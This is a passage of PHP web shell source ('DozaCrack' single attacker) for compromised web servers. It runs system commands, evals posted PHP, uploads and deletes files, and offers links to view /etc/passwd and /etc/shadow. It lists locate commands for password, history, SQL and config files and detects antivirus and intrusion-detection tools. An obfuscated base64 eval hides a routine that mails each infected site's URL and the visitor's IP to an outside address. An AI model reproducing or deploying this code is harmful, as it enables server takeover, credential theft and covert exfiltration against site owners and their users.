		"locate config.inc files" => "locate config.inc",
		"locate config.inc.php" => "locate config.inc.php",
		"locate config.default.php files" => "locate config.default.php",
		"locate config* files " => "locate config",
		"locate .conf files"=>"locate '.conf'",
		"locate .pwd files" => "locate '.pwd'",
		"locate .sql files" => "locate '.sql'",
		"locate .htpasswd files" => "locate '.htpasswd'",
		"locate .bash_history files" => "locate '.bash_history'",
		"locate .mysql_history files" => "locate '.mysql_history'",
		"locate .fetchmailrc files" => "locate '.fetchmailrc'",
		"locate backup files" => "locate backup",
		"locate dump files" => "locate dump",
		"locate priv files" => "locate priv"	
	);

$shell_data = "JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IGlmKCAkdmlzaXRjb3VudCA9PSAiIikgeyR2aXNpdGNvdW50ID0gMDsgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgJHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsgJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7ICRib2R5ID0gIkJvc3MsIHRoZXJlIHdhcyBhbiBpbmplY3RlZCB0YXJnZXQgb24gJHRhcmdldCBieSAkdmlzaXRvciI7IEBtYWlsKCJkMHpfYUB5YWhvby5jb20iLCJGeDI5U2hlbGwgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiLCAiJGJvZHkiKTsgfSBlbHNlIHsgJHZpc2l0Y291bnQ7IH0gc2V0Y29va2llKCJ2aXNpdHMiLCR2aXNpdGNvdW50KTs="; eval(base64_decode($shell_data)); 

function printHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = "UTF-8";
	global $color;
	?>
<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?> ..// DozaCrack | single attacker >>></title>
<link rel="SHORTCUT ICON" href="http://img.dozacrack.org/favicon.gif"> 
<style>
	body {background-color:#000;color:#fff;}
	body,td,th	{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top; }
	span,h1,a	{ color:<?=$color?> !important; }
	span		{ font-weight: bolder; }
	h1			{ border:1px solid <?=$color?>;padding: 2px 5px;font: 14pt Verdana;margin:0px; }
	div.content	{ padding: 5px;margin-left:5px;}
	a			{ text-decoration:none; }
	a:hover		{ background:#ff0000; }
	.ml1		{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
	.bigarea	{ width:100%;height:250px; }
	input, textarea, select	{ margin:0;color:#00ff00;background-color:#000;border:1px solid <?=$color?>; font: 9pt Monospace,"Courier New"; }
	form		{ margin:0px; }
	#toolsTbl	{ text-align:center; }
	.toolsInp	{ width: 80%; }
	.main th	{text-align:left;}
	.main tr:hover{background-color:#5e5e5e;}
	.main td, th{vertical-align:middle;}
	pre			{font-family:Courier,Monospace;}
	#cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}
</style>
<script>
	function set(a,c,p1,p2,p3,charset) {
		if(a != null)document.mf.a.value=a;
		if(c != null)document.mf.c.value=c;
		if(p1 != null)document.mf.p1.value=p1;
		if(p2 != null)document.mf.p2.value=p2;
		if(p3 != null)document.mf.p3.value=p3;
		if(charset != null)document.mf.charset.value=charset;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		document.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = "ajax=true";
		for(i=0;i<document.mf.elements.length;i++)
			params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
		sr('<?=$_SERVER['REQUEST_URI'];?>', params);
	}
	function sr(url, params) {	
		if (window.XMLHttpRequest) {
			req = new XMLHttpRequest();
			req.onreadystatechange = processReqChange;
			req.open("POST", url, true);
			req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
			req.send(params);
		} 
		else if (window.ActiveXObject) {
			req = new ActiveXObject("Microsoft.XMLHTTP");
			if (req) {
				req.onreadystatechange = processReqChange;
				req.open("POST", url, true);
				req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
				req.send(params);
			}
		}
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				//alert(req.responseText);
				var reg = new RegExp("(\\d+)([\\S\\s]*)", "m");
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} 
			else alert("Request error!");
	}
</script>
<head><body><div style="position:absolute;width:100%;top:0;left:0;">
<form method=post name=mf style='display:none;'>
<input type=hidden name=a value='<?=isset($_POST['a'])?$_POST['a']:''?>'>
<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'>
<input type=hidden name=p1 value='<?=isset($_POST['p1'])?htmlspecialchars($_POST['p1']):''?>'>
<input type=hidden name=p2 value='<?=isset($_POST['p2'])?htmlspecialchars($_POST['p2']):''?>'>
<input type=hidden name=p3 value='<?=isset($_POST['p3'])?htmlspecialchars($_POST['p3']):''?>'>
<input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'>
</form>
<?php
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$millink='http://milw0rm.com/search.php?dong=';
	if( strpos('Linux', $kernel) !== false )
		$millink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
	else
		$millink .= urlencode( $kernel . ' ' . substr($release,0,3) );
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(@posix_geteuid());
		$gid = @posix_getgrgid(@posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0;$i<$n-1;$i++) {
		$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
		for($j=0;$j<=$i;$j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $item)
		$opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
	if(!empty($GLOBALS['auth_pass']))
	$m['Logout'] = 'Logout';
	$m['Self remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k => $v)
		$menu .= '<th width="'.(int)(100/count($m)).'%">[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
	$drives = "";
	if ($GLOBALS['os'] == 'win') {
		foreach( range('a','z') as $drive )
		if (is_dir($drive.':\\'))
			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname<br>User<br>Php<br>Hdd<br>Cwd'.($GLOBALS['os'] == 'win'?'<br>Drives':'').'</span></td>'.
		 '<td>:<nobr>'.substr(@php_uname(), 0, 120).'  <a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[Google]</a> <a href="'.$millink.'" target=_blank>[milw0rm]</a></nobr><br>:'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( '.$group.' )<br>:'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=<?=$color?><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>:'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>:'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>:'.$drives.'</td>'.
		 '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'.$opt_charsets.'</optgroup></select><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
		 '<table cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div style="margin:5">';
}

function printFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?"<font color=green>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
?>
</div>
<table class=info id=toolsTbl cellpadding=0 cellspacing=0 width=100%">
	<tr>
		<td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="<?=htmlspecialchars($GLOBALS['cwd']);?>"><input type=submit value=">>"></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
	</tr>
	<tr>
		<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form><?=$is_writable?></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form><?=$is_writable?></td>
	</tr>
	<tr>
		<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'>
		<span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form><?=$is_writable?></td>
	</tr>

</table>
</div>
</body></html>
<?php
}
if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false; } }
if ( !function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false) ) { function posix_getgrgid($p) { return false; } }
function ex($in) {
	$out = '';
	if(function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	}elseif(function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	}elseif(function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	}elseif(function_exists('shell_exec')) {
		$out = shell_exec($in);
	}elseif(is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
function viewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}

function perms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function viewPermsColor($f) { 
	if (!@is_readable($f))
		return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
	elseif (!@is_writable($f))
		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
	else
		return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
}
if(!function_exists("scandir")) {
	function scandir($dir) {
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh))) {
    		$files[] = $filename;
		}
		return $files;
	}
}
function which($p) {
	$path = ex('which '.$p);
	if(!empty($path))
		return $path;
	return false;
}
function actionSecInfo() {
	printHeader();
	echo '<h1>Server security information</h1><div class=content>';
	function showSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>'.$n.': </span>';
			if(strpos($v, "\n") === false)
				echo $v.'<br>';
			else
				echo '<pre class=ml1>'.$v.'</pre>';
		}
	}
	
	showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
	showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
	showSecParam('Open base dir', @ini_get('open_basedir'));
	showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	showSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';
	
	if( $GLOBALS['os'] == 'nix' ) {
		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
		$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
		showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
		showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
		showSecParam('OS version', @file_get_contents('/proc/version'));
		showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
		if(!$GLOBALS['safe_mode']) {
			echo '<br>';
			$temp=array();
			foreach ($userful as $item)
				if(which($item)){$temp[]=$item;}
			showSecParam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(which($item)){$temp[]=$item;}
			showSecParam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item) 
				if(which($item)){$temp[]=$item;}
			showSecParam('Downloaders', implode(', ',$temp));
			echo '<br/>';
			showSecParam('Hosts', @file_get_contents('/etc/hosts'));
			showSecParam('HDD space', ex('df -h'));
			showSecParam('Mount options', @file_get_contents('/etc/fstab'));
		}
	} else {
		showSecParam('OS Version',ex('ver')); 
		showSecParam('Account Settings',ex('net accounts')); 
		showSecParam('User Accounts',ex('net user'));
	}
	echo '</div>';
	printFooter();
}

function actionPhp() {
	if( isset($_POST['ajax']) ) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
		echo strlen($temp), "\n", $temp;
		exit; 
	}
	printHeader();
	if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {
		echo '<h1>PHP info</h1><div class=content>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
		$tmp = preg_replace('!body {.*}!msiU','',$tmp);
		$tmp = preg_replace('!a:\w+ {.*}!msiU','',$tmp);
		$tmp = preg_replace('!h1!msiU','h2',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		$tmp = preg_replace('!body, td, th, h2, h2 {.*}!msiU','',$tmp);
		echo $tmp;
		echo '</div><br>';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
		echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">';
	echo ' <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
	printFooter();
}

function actionFilesMan() {
	printHeader();
	echo '<h1>File manager</h1><div class=content>';
	if(isset($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
					echo "Can't upload file!";
				break;
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($item = readdir($dh) ) !== false) {
						$item = $path.$item;
						if ( (basename($item) == "..") || (basename($item) == ".") )
							continue;
						$type = filetype($item);
						if ($type == "dir")
							deleteDir($item);
						else
							@unlink($item);
					}
					closedir($dh);
					rmdir($path);
				}
				if(is_array(@$_POST['f']))
					foreach($_POST['f'] as $f) {
						$f = urldecode($f);
						if(is_dir($f))
							deleteDir($f);
						else
							@unlink($f);
					}
				break;
			case 'paste':
				if($_SESSION['act'] == 'copy') {
					function copy_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = opendir($c.$s);
							while (($f = readdir($h)) !== false)
								if (($f != ".") and ($f != "..")) {
									copy_paste($c.$s.'/',$f, $d.$s.'/');
								}
						} elseif(is_file($c.$s)) {
							@copy($c.$s, $d.$s);
						}
					}
					foreach($_SESSION['f'] as $f)
						copy_paste($_SESSION['cwd'],$f, $GLOBALS['cwd']);					
				} elseif($_SESSION['act'] == 'move') {
					function move_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = opendir($c.$s);
							while (($f = readdir($h)) !== false)
								if (($f != ".") and ($f != "..")) {
									copy_paste($c.$s.'/',$f, $d.$s.'/');
								}
						} elseif(is_file($c.$s)) {
							@copy($c.$s, $d.$s);
						}
					}
					foreach($_SESSION['f'] as $f)
						@rename($_SESSION['cwd'].$f, $GLOBALS['cwd'].$f);
				}
				unset($_SESSION['f']);
				break;
			default:
				if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')) ) {
					$_SESSION['act'] = @$_POST['p1'];
					$_SESSION['f'] = @$_POST['f'];
					foreach($_SESSION['f'] as $k => $f)
						$_SESSION['f'][$k] = urldecode($f);
					$_SESSION['cwd'] = @$_POST['c'];
				}
				break;
		}
		echo '<script>document.mf.p1.value="";document.mf.p2.value="";</script>';
	}
	$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!'; return;	}
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
?>
<script>
	function sa() {
		for(i=0;i<document.files.elements.length;i++)
			if(document.files.elements[i].type == 'checkbox')
				document.files.elements[i].checked = document.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post>
<?php
	echo "<tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	$dirs = $files = $links = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => date('Y-m-d H:i:s',@filemtime($GLOBALS['cwd'].$dirContent[$i])),
					 'perms' => viewPermsColor($GLOBALS['cwd'].$dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'].$dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'].$dirContent[$i]))
			$links[] = array_merge($tmp, array('type' => 'link'));
		elseif(@is_dir($GLOBALS['cwd'].$dirContent[$i])&& ($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function cmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp($a[$GLOBALS['sort'][0]], $b[$GLOBALS['sort'][0]])*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "cmp");
	usort($dirs, "cmp");
	usort($links, "cmp");
	$files = array_merge($dirs, $links, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');"><b>[ '.htmlspecialchars($f['name']).' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
		$l = $l?0:1;
	}
	?>
	<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'>
	<input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){?><option value='paste'>Paste</option><?php }?></select>&nbsp;<input type="submit" value=">>"></td></tr>
	</form></table></div>
	<?php
	printFooter();
}

function actionStringTools() {
	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= dechex(ord($p[$i]));return strtoupper($r);}}
	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
	
	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		if(function_exists($_POST['p1']))
			echo $_POST['p1']($_POST['p2']);
		$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
	printHeader();
	echo '<h1>String conversions</h1><div class=content>';
	$stringTools = array(
		'Base64 encode' => 'base64_encode',
		'Base64 decode' => 'base64_decode',
		'Url encode' => 'urlencode',
		'Url decode' => 'urldecode',
		'Full urlencode' => 'full_urlencode',
		'md5 hash' => 'md5',
		'sha1 hash' => 'sha1',
		'crypt' => 'crypt',
		'CRC32' => 'crc32',
		'ASCII to HEX' => 'ascii2hex',
		'HEX to ASCII' => 'hex2ascii',
		'HEX to DEC' => 'hexdec',
		'HEX to BIN' => 'hex2bin',
		'DEC to HEX' => 'dechex',
		'DEC to BIN' => 'decbin',
		'BIN to HEX' => 'bin2hex',
		'BIN to DEC' => 'bindec',		
		'String to lower case' => 'strtolower',
		'String to upper case' => 'strtoupper',
		'Htmlspecialchars' => 'htmlspecialchars',
		'String length' => 'strlen',
	);
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
	foreach($stringTools as $k => $v)
		echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
		echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".htmlspecialchars(@$_POST['p2'])."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
	if(!empty($_POST['p1'])) {
		if(function_exists($_POST['p1']))
		echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo"</pre></div>";
	?>
	<br><h1>Search for hash:</h1><div class=content>
		<form method='post' target='_blank' name="hf">
			<input type="text" name="hash" style="width:200px;"><br>
			<input type="button" value="hashcrack.com" onclick="document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()"><br>
			<input type="button" value="milw0rm.com" onclick="document.hf.action='http://www.milw0rm.com/cracker/search.php';document.hf.submit()"><br>
			<input type="button" value="hashcracking.info" onclick="document.hf.action='https://hashcracking.info/index.php';document.hf.submit()"><br>
			<input type="button" value="md5.rednoize.com" onclick="document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()"><br>
			<input type="button" value="md5decrypter.com" onclick="document.hf.action='http://www.md5decrypter.com/';document.hf.submit()"><br>
		</form>
	</div>
	<?php
	printFooter();
}

function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(is_file($_POST['p1']) && is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: ".$type);
			}
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		} elseif(is_dir($_POST['p1']) && is_readable($_POST['p1'])) {

		}
		exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	printHeader();
	echo '<h1>File tools</h1><div class=content>';
	if( !file_exists(@$_POST['p1']) ) {
